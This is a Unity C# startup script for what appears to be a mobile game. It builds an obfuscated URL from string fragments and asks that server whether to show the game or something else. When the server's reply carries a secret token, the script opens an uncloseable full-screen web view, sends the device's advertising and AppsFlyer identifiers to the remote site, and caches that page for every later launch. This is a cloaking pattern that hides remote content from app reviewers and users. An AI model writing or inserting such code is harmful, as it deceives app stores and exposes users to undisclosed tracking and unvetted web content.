using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainAW : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneAWName = "";
    [HideInInspector] public string twoAWName = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaAW") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneAWName = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlAWlink", string.Empty) != string.Empty)
            {
                TissueAWScan(PlayerPrefs.GetString("UrlAWlink"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoAWName += n;
                }
                StartCoroutine(IENUMENATORAW());
            }
        }
        else
        {
            StartAW();
        }
    }

    private void StartAW()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Menu");
    }

    private IEnumerator IENUMENATORAW()
    {
        using (UnityWebRequest aw = UnityWebRequest.Get(twoAWName))
        {

            yield return aw.SendWebRequest();
            if (aw.isNetworkError)
            {
                StartAW();
            }
            int timingAW = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && timingAW > 0)
            {
                yield return new WaitForSeconds(1);
                timingAW--;
            }
            try
            {
                if (aw.result == UnityWebRequest.Result.Success)
                {
                    if (aw.downloadHandler.text.Contains("HeqEdWngmnArlKId"))
                    {

                        try
                        {
                            var subs = aw.downloadHandler.text.Split('|');
                            TissueAWScan(subs[0] + "?idfa=" + oneAWName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            TissueAWScan(aw.downloadHandler.text + "?idfa=" + oneAWName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        StartAW();
                    }
                }
                else
                {
                    StartAW();
                }
            }
            catch
            {
                StartAW();
            }
        }
    }

    private void TissueAWScan(string UrlAWlink, string NamingAW = "", int pix = 70)
    {        
        UniWebView.SetAllowInlinePlay(true);
        var _linksAW = gameObject.AddComponent<UniWebView>();
        _linksAW.SetToolbarDoneButtonText("");
        switch (NamingAW)
        {
            case "0":
                _linksAW.SetShowToolbar(true, false, false, true);
                break;
            default:
                _linksAW.SetShowToolbar(false);
                break;
        }
        _linksAW.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _linksAW.OnShouldClose += (view) =>
        {
            return false;
        };
        _linksAW.SetSupportMultipleWindows(true);
        _linksAW.SetAllowBackForwardNavigationGestures(true);
        _linksAW.OnMultipleWindowOpened += (view, windowId) =>
        {
            _linksAW.SetShowToolbar(true);

        };
        _linksAW.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingAW)
            {
                case "0":
                    _linksAW.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _linksAW.SetShowToolbar(false);
                    break;
            }
        };
        _linksAW.OnOrientationChanged += (view, orientation) =>
        {
            _linksAW.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _linksAW.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlAWlink", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlAWlink", url);
            }
        };
        _linksAW.Load(UrlAWlink);
        _linksAW.Show();
    }
}
